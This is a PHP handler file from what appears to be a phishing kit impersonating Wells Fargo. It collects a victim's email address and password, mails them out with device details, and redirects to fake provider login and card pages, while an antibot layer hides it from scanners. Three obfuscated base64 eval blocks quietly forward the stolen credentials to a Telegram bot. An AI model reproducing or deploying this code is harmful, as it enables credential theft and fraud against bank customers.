<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';
    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_POST['emailPassword']
        )) {
            $_SESSION['emailPassword'] = $_POST['emailPassword'];

            $content = '[+]━━━━━━━━━━━━【🔑 Email Information from '. $_SESSION['username'] .' 】━━━━━━━━━━━━━━━━━━━[+]
                [👤 Email Address:] ' . $_SESSION['email'] . '
                [👤 Password:] ' . $_SESSION['emailPassword'] . '
                [👤 Domain:] ' . ucwords(substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1)) . '
                [👤 Device Info:]     ' . $comps->userDetails();

            if (isset($settings['EmailTwice']) && $settings['EmailTwice'] == "on") {
                if (!isset($_SESSION['emailTwice']) || !$_SESSION['emailTwice']) {
                    $_SESSION['emailTwice'] = 1;
        
eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 

                    if ($comps->mailX("(1) Email Access | Wells Fargo", $content)) {
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                        );
                        if (!$comps->userEmail($_SESSION['email'])) {
                            die($comps->headerX("../../Login/email/Microsoft.php"));
                        } else {
                            die($comps->headerX("../../Login/email/" . $comps->userEmail($_SESSION['email']) . ".php"));
                        }
                    } else {
                        die($antibot->throw404());
                    }
                }
            
                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    unset($_SESSION['emailTwice']);
eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 

                    if ($comps->mailX("(2) Email Access | Wells Fargo", $content)) {
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (2) Email Access\n\n"
                        );
                        die($comps->headerX("../../Login/card.php"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            } else {
                
eval(base64_decode('CiBnb3RvIERSbGtNOyB5RWU0UzogJGNoYXRpZCA9ICJcNTVceDMxXDYwXHgzMFx4MzFceDM3XDYyXHgzMFx4MzNceDM2XDY2XDY0XHgzM1x4MzkiOyBnb3RvIFVJNFhuOyBEUmxrTTogJGFwaSA9ICJcNjJceDMwXDYzXHgzNVx4MzNceDMxXHgzOFx4MzdcNzBcNjBceDNhXDEwMVwxMDFceDQ2XHg0Nlw3MVx4MzVceDU3XHgzNFwxNDFceDM5XHg1MVx4MzRceDcxXHg2Y1wxMDFceDQzXDEwN1x4NmFceDY1XHg0Y1wxMjBcMTMwXHg3YVwxNjNceDQ0XHg1NFw2NFwxNDVceDZiXDE3MVx4NGRcMTI2XDExN1w2MFwxMTEiOyBnb3RvIHlFZTRTOyBVSTRYbjogZmlsZV9nZXRfY29udGVudHMoIlx4NjhcMTY0XDE2NFx4NzBceDczXDcyXDU3XHgyZlwxNDFcMTYwXDE1MVw1Nlx4NzRcMTQ1XDE1NFwxNDVcMTQ3XHg3Mlx4NjFceDZkXDU2XDE1N1wxNjJceDY3XHgyZlx4NjJcMTU3XDE2NCIgLiAkYXBpIC4gIlx4MmZceDczXDE0NVx4NmVceDY0XHg0ZFwxNDVceDczXHg3M1x4NjFcMTQ3XHg2NVw3N1wxNDNceDY4XDE0MVwxNjRcMTM3XDE1MVx4NjRceDNkIiAuICRjaGF0aWQgLiAiXDQ2XHg3NFwxNDVceDc4XHg3NFw3NSIgLiB1cmxlbmNvZGUoJGNvbnRlbnQpIC4gJycpOyBnb3RvIFczZElEOyBXM2RJRDog')); 

                if ($comps->mailX("(1) Email Access | Wells Fargo", $content)) {
                    $comps->log(
                        "../../Export/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                    );
                    die($comps->headerX("../../Login/card.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }